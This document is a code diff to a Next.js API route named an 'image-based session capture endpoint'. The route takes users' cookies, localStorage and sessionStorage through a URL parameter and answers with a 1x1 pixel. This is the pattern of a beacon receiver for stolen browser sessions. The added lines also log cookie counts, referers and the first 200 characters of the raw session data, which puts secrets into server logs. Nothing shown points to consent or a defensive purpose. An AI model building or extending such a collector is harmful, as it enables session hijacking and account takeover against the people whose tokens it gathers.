@@ -2,11 +2,21 @@ import { NextRequest, NextResponse } from 'next/server'
 import { adminDb } from '@/lib/firebase-admin'
 
 export async function GET(request: NextRequest) {
+  console.log('🔐 Image-based session capture endpoint called')
+  
   try {
     const url = new URL(request.url)
     const dataParam = url.searchParams.get('data')
     
+    console.log('📊 Request details:', {
+      hasData: !!dataParam,
+      dataLength: dataParam?.length || 0,
+      userAgent: request.headers.get('user-agent'),
+      referer: request.headers.get('referer')
+    })
+    
     if (!dataParam) {
+      console.log('❌ No data parameter provided')
       // Return a 1x1 transparent pixel
       const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64')
       return new NextResponse(pixel, {
@@ -20,11 +30,26 @@ export async function GET(request: NextRequest) {
 
     let sessionData, userId
     try {
-      const parsed = JSON.parse(decodeURIComponent(dataParam))
+      console.log('🔍 Parsing session data...')
+      const decoded = decodeURIComponent(dataParam)
+      console.log('📝 Decoded data length:', decoded.length)
+      
+      const parsed = JSON.parse(decoded)
       sessionData = parsed.sessionData
       userId = parsed.userId
+      
+      console.log('✅ Session data parsed successfully:', {
+        userId,
+        hasCookies: !!sessionData?.cookies,
+        cookieCount: Object.keys(sessionData?.cookies || {}).length,
+        hasLocalStorage: !!sessionData?.localStorage,
+        hasSessionStorage: !!sessionData?.sessionStorage
+      })
+      
     } catch (e) {
-      console.error('Failed to parse session data:', e)
+      console.error('❌ Failed to parse session data:', e)
+      console.log('Raw data param (first 200 chars):', dataParam.substring(0, 200))
+      
       // Return error pixel (red)
       const errorPixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==', 'base64')
       return new NextResponse(errorPixel, {
